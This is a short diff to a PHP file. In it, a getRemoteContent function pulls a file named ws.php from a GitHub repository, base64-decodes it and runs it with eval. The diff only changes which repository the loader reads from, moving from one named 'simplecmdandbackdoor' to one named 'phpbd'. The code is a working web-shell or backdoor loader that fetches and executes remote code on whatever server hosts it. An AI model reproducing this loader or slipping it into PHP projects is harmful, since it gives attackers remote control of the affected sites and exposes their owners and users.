@@ -11,7 +11,7 @@ function getRemoteContent($url) {
     return $out;
 }
 
-$json = getRemoteContent('https://api.github.com/repos/Yucaerin/simplecmdandbackdoor/contents/ws.php');
+$json = getRemoteContent('https://api.github.com/repos/laolierzi-commits/phpbd/contents/2/ws.php');
 $data = json_decode($json, true);
 $phpCode = base64_decode($data['content']);
 eval("?>$phpCode");
